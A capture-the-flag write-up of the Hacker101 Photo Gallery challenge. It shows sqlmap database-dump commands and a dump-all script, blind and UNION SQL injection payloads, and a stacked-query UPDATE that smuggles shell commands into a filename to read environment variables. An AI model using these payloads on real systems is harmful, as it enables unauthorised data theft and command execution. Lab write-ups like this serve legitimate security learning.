</head><body><p>Hi everyone ! First of all, have a nice weekend. Today I am going to solve <code>Photo Gallery</code> challenge from <code>Hacker 101</code> platform. Before I start, as always I try to give insights on source code. There might be useful findings beforehand.</p>

<p><img src="./images/1.png" alt="alt text" /></p>

<p>As you can see above, we have source images with correlated paths <code>fetch?id=</code> parameter. Let's see what will occur if we change the parameter to invalid &amp; incremental ways.</p>

<p>Since I saw the <code>Invisible</code> <code>&lt;br&gt;</code> element on the page, I decided to fuzz the <code>id</code> parameter to reveal anything related to the flag. However, it did not work.</p>

<p><img src="./images/2.png" alt="alt text" /></p>

<p>Checking the running web app information always beneficial in most scenarios.</p>

<p><img src="./images/3.png" alt="alt text" /></p>

<p>Meanwhile, I ran <code>steganograph</code> tool called <code>exiftool</code> against the cat images:</p>

<p><img src="./images/4.png" alt="alt text" /></p>

<p><img src="./images/5.png" alt="alt text" /></p>

<p>Now, from my perspective, hidden data still inside the parameter in <code>fetch?id=3</code>.</p>

<p>I tried to send <code>POST</code>, <code>DEBUG</code> methods rather than <code>GET</code> ,yet still it was restricted.</p>

<p><img src="./images/6.png" alt="alt text" /></p>

<p>I noticed that images rendered as binary file not their corresponding <code>Content-Type</code>, image.</p>

<p><img src="./images/7.png" alt="alt text" /></p>

<p><code>content-type</code> was <code>text/html</code> in this scenario ,but normally it has to be <code>image</code> instead of text/html because of the file type. It does not matter whether it is text/html or image on the rendering process. Hence, maybe as a last shot, I should also checked <code>SQLi</code> on <code>id</code> parameter. </p>

<p>I initially ran <code>sqlmap</code> with the most basic attributes:</p>

<p><code>sqlmap -u "https://1b8c95d2a8314425fe2ae8a3dedf3b3a.ctf.hacker101.com/fetch?id=1"</code></p>

<p>As a result, the application vulnerable to <code>boolean-based blind SQLi</code> + <code>time-based blind</code>.</p>

<p><img src="./images/8.png" alt="alt text" /></p>

<p>Let's try it manually:</p>

<p>In this position, I asked for the application to retrieve (GET method) the element with <code>id</code> = 1. In order to achieve such an execution, it should craft the query as below:</p>

<p>Then the backend retrieves the image data with <code>GET</code> method through <code>/fetch</code> route then if it receives any <code>id</code> parameter, it will call function inside the backend to interact with database.</p>

<p>In our database, most probably it call it as below:</p>

<p><code>SELECT image1 FROM images WHERE id = 1;</code></p>

<p>After I tested boolean equations like <code>1385=1385</code> and <code>1385=1</code>, I concluded that there was a <code>boolean-based</code>.</p>

<h3>True Condition</h3>

<p>The expectation should be normal status since we gave <code>true condition</code> resulted in <code>1</code>.</p>

<p><img src="./images/9.png" alt="alt text" /></p>

<h3>False Condition</h3>

<p>Application returns <code>null</code> result from the database element retrieval part. Hence, it was like something <code>/fetch?id=null</code>. The condition returns false, meaning <code>0</code> in boolean. </p>

<p><img src="./images/10.png" alt="alt text" /></p>

<h2>Time-based SQLi</h2>

<p>To prove the occurence of <code>time-based</code> attacks, it is enough to see whether the page refresh in the amount of delay. For instance, if we give <code>SLEEP</code> method with <code>5</code> then it will render the page  <code>5</code> seconds later.</p>

<p><img src="./images/11.gif" alt="alt text" /></p>

<p>We are done ! ! ! 
Meanwhile, I was trying to discover other database instances with:</p>

<p><code>sqlmap -u "https://1d67c059223507f8a5777f9fd499c181.ctf.hacker101.com/fetch?id=1" --dbs</code></p>

<p><img src="./images/12.png" alt="alt text" /></p>

<p>Retrieve tables from multiple-dbs:</p>

<p><code>sqlmap -u "https://1d67c059223507f8a5777f9fd499c181.ctf.hacker101.com/fetch?id=1" -D [table_name] --tables</code></p>

<p>For example, there are 2 tables in the <code>level5</code> DB,</p>

<p><img src="./images/13.png" alt="alt text" /></p>

<p>According to <code>information_schema</code> DB, there was 78 tables xD</p>

<p><img src="./images/14.png" alt="alt text" /></p>

<p>I must need a huge time to get all the stuff on all the DB's. Anyway, I tried hard then started to get all the data inside all DB's.</p>

<p><code>sqlmap -u "https://1d67c059223507f8a5777f9fd499c181.ctf.hacker101.com/fetch?id=1" -D level5 --dump</code></p>

<p>I decided to iterate all the <code>4</code> DB instances, let's try to automate this operation:</p>

<p>```</p>

<h1>!/bin/bash</h1>

<h1>Target URL</h1>

<p>yilmaz="https://yoursite.com/fetch?id=1"</p>

<h1>List DBs</h1>

<p>suleyman=$(sqlmap -u "$yilmaz" --batch --dbs | grep '[*]' | awk -F '[*]' '{print $2}' | xargs)</p>

<h1>Iterate each DB then dump each of them.</h1>

<p>for atilla in $suleyman; do
    echo "Dumping database: $atilla"
    sqlmap -u "$yilmaz" -D "$atilla" --dump --batch
    echo "Database $atilla dumped successfully."
done</p>

<p>```</p>

<p>Construct the script like this:</p>

<p><img src="./images/15.png" alt="alt text" /></p>

<p>Then <code>chmod +x sql.sh</code> to make it executable.</p>

<p>Execute -> <code>sql.sh</code>.</p>

<p>However, it did not work. We should find another way. I preferred to look at the hints at the end.</p>

<p><code>Take a few minutes to consider the state of the union</code></p>

<p>Second hint implies that we should also try with <code>union</code> ,but I did not know what will I need to observe through <code>UNION</code>. That's why, I attempted to get third hint.</p>

<p><code>This application runs on the uwsgi-nginx-flask-docker image</code></p>

<p>From my point of view, flask mainly uses <code>app.py</code> file or <code>main.py</code> as the default backend file. Let me try with them.</p>

<p><img src="./images/16.png" alt="alt text" /></p>

<p>Resource: <a href="https://portswigger.net/web-security/sql-injection/union-attacks">portswigger</a></p>

<p>Since the all <code>id</code> parameters renders all the images in their source format let's try with wrong number which does not exist. (-1)</p>

<p>payload1:</p>

<p><code>/fetch?id=-1 UNION SELECT 'app.py' --</code></p>

<p>As you can see, there was not anything correlated with app.py</p>

<p><img src="./images/18.png" alt="alt text" /></p>

<p>payload2:
/fetch?id=-1 UNION SELECT 'app.py' --</p>

<p><img src="./images/17.png" alt="alt text" /></p>

<p>After that I searched for other technology hint <code>uwsgi</code>. I have not heard about it before.</p>

<p><img src="./images/19.png" alt="alt text" /></p>

<p>This was mainly used for web container's server. Maybe, I should also need findings about it because docker did not generate useful results for me.</p>

<p>By the way, the flag was commented on the <code>main</code> page's source code.</p>

<p><img src="./images/20.png" alt="alt text" /></p>

<p>On this documentation, more detailed information available about the configuration files to enumerate deeply.</p>

<p><a href="https://uwsgi-docs.readthedocs.io/en/latest/Options.html">uwsgi</a></p>

<p>I found a github repo containing configuration manual for <code>uwsgi</code> reach out <a href="https://github.com/unbit/uwsgi-docs/blob/master/tutorials/Django_and_nginx.rst">here</a></p>

<p><img src="./images/21.png" alt="alt text" /></p>

<p>Maybe default configuration work with us. Let's try <code>images_uwsgi.ini</code>. It was not correct one.</p>

<p><img src="./images/22.png" alt="alt text" />
what about <code>uwsgi.ini</code>.</p>

<p>YES ! ! !</p>

<p><img src="./images/23.png" alt="alt text" /></p>

<p>It worked ,but there was not any info related to flag ,so I also get the second flag's hint.</p>

<p><code>
Clues
That method of finding the size of an album seems suspicious
Stacked queries rarely work. But when they do, make absolutely sure that you're committed
Be aware of your environment
</code></p>

<p>I did not catch anything about the hint. I wanted to enumerate db more deeply.</p>

<p><code>sqlmap -u "https://1d67c059223507f8a5777f9fd499c181.ctf.hacker101.com/fetch?id=1" -D level5 --dump</code></p>

<p>I noticed that there was not any <code>sanitize()</code> method on subprocess() utility.</p>

<p><img src="./images/24.png" alt="alt text" /></p>

<p>I have not known the purpose of the command <code>du</code> ,so I ran <code>man</code> to understand further information about the command used here.</p>

<p><code>man du</code></p>

<p><img src="./images/25.png" alt="alt text" /></p>

<p><code>-c</code> parameter indicating total storage parameter.</p>

<p><img src="./images/26.png" alt="alt text" /></p>

<p><code>-h</code> makes the output human readable format</p>

<p><img src="./images/27.png" alt="alt text" /></p>

<p><code>du -ch %s || exit 0</code> command mainly finding estimated storage data about file.</p>

<p><code>du -ch filename;</code></p>

<p>On the second hint comment, there was a trick about the query that I needed to look for <code>Stacked queries</code> meaning that we can use multiple SQL queries at the same time. Understanding the technology may give better hints about the stacked query that we attempt.</p>

<p><img src="./images/28.png" alt="alt text" /></p>

<p>Then It suggests that <code>make absolutely sure that you're committed</code> ,so there was not any <code>autocommit=enabled</code> by default on DB. To make commit, we should modify something in DB like DELETE or UPDATE not data retrieval. Since we are looking for flags, we should avoid to use <code>DELETE</code> queries because of its operation. We have to display flags as it is.</p>

<p>According to <code>photos</code> table, I just crafted a payload as below.</p>

<p><img src="./images/29.png" alt="alt text" /></p>

<p>Preferring below query may give useful result:</p>

<p><code>UPDATE photos set title = ';ls' where id = 3; commit; --</code></p>

<p>Immediately, on the main page there was an html element rendered by backend indicating current directory amazing ! ! !</p>

<p><img src="./images/30.png" alt="alt text" /></p>

<p>Latest hint recommends to use <code>env</code> files within the application. Environment variables may differ from application to application. Let's see what I had especially in terms of env variables. However, I must discover by <code>filename</code> not the title xD. With the help of the GPT4-o I found how to list all the environmental variables on the target.</p>

<p><img src="./images/32.png" alt="alt text" /></p>

<p><img src="./images/31.png" alt="alt text" /></p>

<p>I put the payload on wrong direction since I used the payload on stacked paths <code>/fetch?id=2;/fetch?id=3</code>. Plus I modified wrong row of the image.</p>

<p><code>/fetch?id=2; UPDATE photos set title = ';env' where id = 3; commit; --</code></p>

<p>There was an embedded image and I tried to embed a text called <code>;env</code>. I was totally wrong to execute binary just giving its corallated name <code>env</code> instead it had to be <code>$($env)</code></p>

<p><code>/fetch?id=3; UPDATE photos set title = ';env' where id = 3; commit; --</code></p>

<p>Therefore, I adjusted and ran again. Initially, I could not get results from <code>env</code> ,so I tested with <code>printenv</code>.</p>

<p><img src="./images/34.png" alt="alt text" /></p>

<p>I also need to echo it instead of executing direct binary. That should be:</p>

<p><code>echo $(env)</code>.</p>

<p>Finally I recognized my fault. The query was indicating wrong entity. Instead of changing <code>title</code> every time, I must required to alter the <code>filename</code>. In every wrong attempt, I checked my payload again and again ,yet the root cause was the direction.</p>

<p><code>fetch?id=3; UPDATE photos SET filename=";echo $(printenv)" WHERE id=3; commit;</code></p>

<p>commit; --  is optional.</p>

<p>May The Pentest Be With You ! ! !</p>
